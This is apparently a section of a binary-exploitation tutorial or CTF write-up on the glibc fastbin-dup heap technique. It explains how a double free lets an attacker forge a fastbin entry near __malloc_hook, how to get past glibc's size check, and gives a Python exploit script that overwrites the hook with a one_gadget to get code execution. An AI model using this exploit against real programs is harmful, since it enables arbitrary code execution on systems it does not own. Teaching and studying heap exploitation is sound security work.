## Implementation

The goal is to corrupt the fastbin last item's forward pointer via a double free vulnerability for instance.
corrupting that pointer allows to create a fake entry in the fastibin, wich will be return by malloc as a last fastbin item. If we can control this pointer, we can control the address of fake item that will be return through malloc and potentially written to by the victim's code afterwards. hence giving an arbitrary write primitive.

### Mitigation
One issue to look for is glibc's mitigation wich checks if the size field of a fastbin item is within the size boundaries of its fastbin before it can be return through malloc.

To bypass this mitigation it becomes mendatory to set or find a naturaly occurence where the 8 or 4 bytes values before our target corresponds to its corresponding fastbin size before calling malloc, or an execption will be thrown with a corrupted fastbin message.

One can also use unaligned addresses and find a libc address which will start with 0x7f on 64 bits systems and which previous address is equal to 0.

```python
chunk_A = malloc(0x68, "A"*0x68)
chunk_B = malloc(0x68, "B"*0x68)

# Free the first chunk, then the second to perform the double free vulnerability
free(chunk_A)
free(chunk_B)
free(chunk_A)


viable_fake_bin_offset = 27+8 # 0x7f at malloc_hook-27, so viable addr at malloc-27 + 8 (address after the size field)

# Write the target address to the duplicated item, wich is also the forward pointer in the duplicate located in the fastbin
dupA = malloc(0x68, p64(libc.sym.__malloc_hook - viable_fake_bin_offset))

# Empty the fastbin until the last element (the crafted fake item)
chunk_A = malloc(0x68, "A"*0x68)
chunk_A = malloc(0x68, "A"*0x68)

one_gadget = 0xe1fa1 # We use a one gadget for convenience
# Write your data at the target address
chunk_A = malloc(0x68, (b"Q" * (viable_fake_bin_offset-16)) + p64(one_gadget + libc.address))

# Trigger malloc_hook
chunk_A = malloc(0, b'')
```